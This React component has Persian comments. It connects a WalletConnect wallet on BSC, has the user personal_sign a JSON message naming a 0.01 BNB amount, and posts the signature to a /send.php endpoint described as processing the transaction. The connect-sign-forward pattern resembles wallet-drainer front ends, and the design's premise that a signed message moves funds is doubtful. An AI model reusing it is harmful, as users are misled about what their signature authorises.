import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign"], // متد personal_sign
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "/send.php"; // آدرس سرور برای پردازش تراکنش

    async function getRawSignature(address, balance) {
      try {
        let message = JSON.stringify({
          sender: address,
          balance: balance,
          timestamp: Date.now(),
        });

        var rawSignature = await provider.request({
          method: "personal_sign",
          params: [message, address],
        });

        return { rawSignature, message };
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, message) {
      try {
        let requestData = {
          signedData: signature,
          message: message,
        };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    let balance = "0.01"; // مقدار BNB مورد انتقال
    var signedData = await getRawSignature(sender, balance);

    if (signedData) {
      console.log("✍️ Signed Raw Data:", signedData);
      var txHash = await sendSignedTransaction(
        signedData.rawSignature,
        signedData.message
      );
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
